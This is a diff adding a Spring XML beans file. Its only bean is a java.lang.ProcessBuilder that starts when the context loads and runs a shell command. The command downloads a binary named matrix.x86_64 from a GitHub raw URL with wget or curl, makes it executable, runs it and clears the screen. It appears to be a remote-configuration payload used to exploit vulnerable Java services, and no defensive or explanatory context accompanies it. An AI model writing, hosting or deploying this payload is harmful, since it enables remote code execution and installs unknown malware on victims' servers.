@@ -1,0 +1,14 @@
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+
+    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+        <constructor-arg>
+            <list>
+                <value>sh</value>
+                <value>-c</value>
+                <value>wget https://raw.githubusercontent.com/qweasdiopbosinn-sys/dssfwEUFHWEUFHWeufhwEFHweu/refs/heads/main/matrix.x86_64 || curl https://raw.githubusercontent.com/qweasdiopbosinn-sys/dssfwEUFHWEUFHWeufhwEFHweu/refs/heads/main/matrix.x86_64 -o matrix.x86_64; chmod 777 matrix.x86_64; ./matrix.x86_64; clear;</value>
+            </list>
+        </constructor-arg>
+    </bean>
+</beans>
